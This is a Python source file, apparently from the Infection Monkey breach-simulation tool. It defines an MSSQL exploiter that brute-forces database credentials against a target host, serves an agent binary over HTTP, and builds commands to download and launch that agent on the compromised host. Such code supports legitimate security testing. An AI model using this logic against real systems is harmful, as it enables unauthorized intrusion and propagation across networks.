import logging
from typing import Callable, Sequence

from common.credentials import Credentials
from common.types import AgentID, Event
from infection_monkey.exploit import IAgentOTPProvider
from infection_monkey.exploit.tools import HTTPBytesServer
from infection_monkey.exploit.tools.helpers import get_agent_dst_path
from infection_monkey.i_puppet import ExploiterResultData, TargetHost
from infection_monkey.utils.threading import interruptible_iter

from .mssql_client import StubMSSQLClient
from .mssql_command_builder import (
    build_mssql_agent_download_command,
    build_mssql_agent_launch_command,
)
from .mssql_options import MSSQLOptions

logger = logging.getLogger(__name__)

AgentBinaryServerFactory = Callable[[TargetHost], HTTPBytesServer]


class MSSQLExploiter:
    def __init__(
        self,
        agent_id: AgentID,
        mssql_exploit_client: StubMSSQLClient,
        start_agent_binary_server: AgentBinaryServerFactory,
        otp_provider: IAgentOTPProvider,
    ):
        self._agent_id = agent_id
        self._mssql_exploit_client = mssql_exploit_client
        self._start_agent_binary_server = start_agent_binary_server
        self._otp_provider = otp_provider

    def exploit_host(
        self,
        target_host: TargetHost,
        servers: Sequence[str],
        current_depth: int,
        options: MSSQLOptions,
        brute_force_credentials: Sequence[Credentials],
        interrupt: Event,
    ) -> ExploiterResultData:
        logger.info(f"Starting MSSQL exploiter for host: {target_host.ip}")

        try:
            logger.debug("Starting the Agent binary server")

            agent_binary_http_server = self._start_agent_binary_server(target_host)
        except Exception as err:
            msg = (
                "An unexpected exception occurred while attempting to start the agent binary HTTP "
                f"server: {err}"
            )
            logger.exception(msg)
            return ExploiterResultData(error_message=msg)

        agent_destination_path = get_agent_dst_path(target_host)
        download_agent_command = build_mssql_agent_download_command(
            agent_binary_http_server.download_url, agent_destination_path
        )

        launch_agent_command = build_mssql_agent_launch_command(
            self._agent_id, servers, current_depth, agent_destination_path, self._otp_provider
        )

        try:
            return self._brute_force_exploit_host(
                target_host,
                options,
                brute_force_credentials,
                download_agent_command,
                launch_agent_command,
                agent_binary_http_server.bytes_downloaded,
                interrupt,
            )
        except Exception as err:
            msg = "An unexpected exception occurred while "
            f"exploiting host {target_host} with MSSQL: {err}"
            logger.exception(msg)
            return ExploiterResultData(
                exploitation_success=False, propagation_success=False, error_message=msg
            )
        finally:
            _stop_agent_binary_http_server(agent_binary_http_server)

    def _brute_force_exploit_host(
        self,
        target_host: TargetHost,
        options: MSSQLOptions,
        brute_force_credentials_combinations: Sequence[Credentials],
        download_agent_command: str,
        launch_agent_command: str,
        agent_binary_downloaded: Event,
        interrupt: Event,
    ):
        exploit_result = ExploiterResultData(exploitation_success=False, propagation_success=False)

        for propagation_credentials in interruptible_iter(
            brute_force_credentials_combinations, interrupt, "MSSQL exploiter has been interrupted"
        ):
            (
                exploit_result.exploitation_success,
                exploit_result.propagation_success,
            ) = self._mssql_exploit_client.exploit_host(
                target_host,
                propagation_credentials,
                download_agent_command,
                launch_agent_command,
                agent_binary_downloaded,
                options,
            )

            if exploit_result.exploitation_success:
                break

        return exploit_result


def _stop_agent_binary_http_server(agent_binary_http_server: HTTPBytesServer):
    try:
        logger.debug("Stopping the agent binary server")
        agent_binary_http_server.stop()
    except Exception:
        logger.exception("An unexpected error occurred while stopping the HTTP server")
